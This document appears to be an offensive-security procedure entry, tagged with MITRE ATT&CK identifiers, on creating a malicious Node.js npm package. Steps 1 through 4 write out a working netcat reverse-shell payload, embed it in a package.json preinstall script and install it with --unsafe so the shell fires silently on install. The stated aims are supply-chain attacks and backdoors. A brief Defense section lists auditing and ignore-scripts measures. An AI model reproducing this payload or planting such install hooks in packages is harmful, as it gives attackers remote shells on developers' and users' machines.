---
id: 581f0383-055d-4e0b-a5d5-5f64f2d1e085
name: Create-Malicious-NodeJS-NPM-Package
type: procedure
verified: true
submitted: true
created_at: '2019-10-31T22:50:53.903674+00:00'
updated_at: '2023-05-26T18:53:01.582006+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
sub_techniques: []
platforms:
  - Linux
tags:
  - '[[tags/backdoor]]'
commands:
  - '[[commands/npm-install-package-with-preinstall-scripts]]'
tools: []
validated: true
---

# Create-Malicious-NodeJS-NPM-Package

## Summary

This procedure demonstrates how to create a malicious Node.js npm package that executes arbitrary code during installation via a preinstall script. By embedding a payload in the package.json scripts section, attackers can achieve remote code execution when a victim installs the package, particularly useful for supply chain attacks or targeted malware distribution.

## Description

npm, the Node Package Manager, allows packages to define lifecycle scripts like 'preinstall' that run automatically during installation. This can be abused to execute malicious commands, such as reverse shells, without the installer's knowledge. While npm restricts certain operations when running as root, the --unsafe flag bypasses these protections. This technique targets developers or systems relying on untrusted npm packages, leading to execution in the context of the installation process. It maps to MITRE ATT&CK T1203 for exploiting client-side execution vectors in package managers.

## Requirements

1. Node.js and npm installed on the attacker's machine (version 6+ recommended).
2. Access to a listener for the payload (e.g., netcat on attacker host).
3. Target environment: Linux systems with npm for package installation.
4. Basic bash scripting knowledge for payload customization.

## Defense

Defensive measures and detection strategies:

- Audit package.json files in dependencies for suspicious scripts like preinstall.
- Use npm audit and tools like Snyk to scan for malicious packages.
- Run npm installs in isolated environments (e.g., Docker) and avoid --unsafe flag.
- Monitor for unexpected network connections or file creations during installs (e.g., fifos in /tmp).
- Enable npm configuration to ignore scripts: npm config set ignore-scripts true.

## Objectives

1. Create a functional malicious npm package with an embedded payload.
2. Ensure the preinstall script executes reliably on installation.
3. Achieve remote code execution on the victim's machine via package install.
4. Demonstrate persistence or backdoor establishment through the payload.

## Instructions

### Step 1: Prepare the Reverse Shell Payload

**Context**: Select and customize a bash payload for remote code execution. This payload creates a FIFO pipe and establishes a reverse shell using netcat to connect back to the attacker.

**Code** ([[codes/bash-netcat-reverse-shell-via-fifo]]):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```

> This code removes any existing /tmp/f, creates a named pipe, and spawns an interactive shell piped through netcat to the attacker's IP and port. Replace $_ATTACKER_IP and $_ATTACKER_PORT with actual values before use. Expected output: No visible output during execution, but a connection should appear on the attacker's listener.

### Step 2: Initialize the Malicious Package Directory

**Context**: Create a new directory for the package and initialize it with npm to generate the base package.json file. This sets up the structure for adding the malicious script.

```bash
mkdir -p pwnme && cd pwnme && npm init -y
```

> The -y flag accepts all defaults for quick setup. Expected output: A new package.json file is created in the pwnme directory with basic metadata.

### Step 3: Modify package.json to Add Preinstall Script

**Context**: Edit the generated package.json to include the preinstall script with the payload. This ensures the code runs automatically on npm install.

**Code** ([[codes/malicious-npm-package-json-with-preinstall]]):

```javascript
{
  "name": "pwnme",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "preinstall": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f"
  },
  "author": "",
  "license": "ISC"
}
```

> Replace the payload in the preinstall field with your customized version, ensuring proper escaping if needed. Note the comma after the 'test' script. Expected output: Updated package.json file ready for distribution.

### Step 4: Install the Package to Trigger Execution

**Context**: Install the malicious package on a target system to execute the preinstall script. Use --unsafe if running with elevated privileges to bypass npm restrictions.

**Command** ([[commands/npm-install-package-with-preinstall-scripts]]):

```bash
npm i ./pwnme --unsafe
```

> Navigate to the directory containing the package or provide the path. The --unsafe flag is crucial for root installs. Expected output: npm warnings about missing fields, but the preinstall script executes silently, establishing the reverse shell if netcat is available on the target.
